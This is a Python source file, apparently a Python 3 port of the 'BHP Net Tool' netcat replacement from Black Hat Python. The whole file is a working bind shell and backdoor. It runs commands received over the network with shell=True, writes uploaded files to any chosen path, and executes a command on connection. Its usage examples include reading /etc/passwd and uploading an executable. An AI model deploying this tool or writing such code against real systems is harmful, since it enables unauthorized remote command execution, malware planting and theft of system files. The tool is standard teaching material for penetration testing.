import sys
import socket
import getopt
import threading
import subprocess

# Define global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destination]")
    print()
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # Read the command-line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        try:
            # Read in the buffer from stdin
            buffer = sys.stdin.read()
        except EOFError:
            buffer = ""

        # Send data off
        client_sender(buffer)

    # If we are listening, set up the server loop
    if listen:
        server_loop()

def client_sender(buffer):
    global target, port
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode())  # Encode the buffer before sending

        while True:
            # Wait for data back
            response = ""
            while True:
                data = client.recv(4096).decode()  # Decode after receiving
                response += data
                if len(data) < 4096:
                    break

            print(response, end="")  # Print the response

            # Wait for more input
            buffer = input("")  # Use input in Python 3
            if buffer.lower() == "exit":
                client.close()
                break
            buffer += "\n"
            client.send(buffer.encode())  # Encode before sending

    except Exception as e:
        print(f"[*] Exception! Exiting. {e}")
        client.close()

def server_loop():
    global target, port

    # If no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    print(f"[*] Listening on {target}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        # Spin off a thread to handle the new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Trim the newline
    command = command.rstrip()

    # Run the command and return the output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = f"Failed to execute command. Error: {e}\n".encode()

    return output

def client_handler(client_socket):
    global upload, command, execute, upload_destination

    # Check for file upload
    if len(upload_destination):
        file_buffer = b""  # Use bytes for file operations

        # Keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data

        # Write the file to the specified destination
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)
            client_socket.send(f"Successfully saved file to {upload_destination}\n".encode())
        except Exception as e:
            client_socket.send(f"Failed to save file to {upload_destination}. Error: {e}\n".encode())

    # Check for command execution
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    # If a command shell was requested, go into a loop
    if command:
        while True:
            # Show a simple prompt
            client_socket.send(b"<BHP:#> ")

            # Receive a command
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            # Execute the command and send back the response
            response = run_command(cmd_buffer)
            client_socket.send(response)

if __name__ == "__main__":
    main()
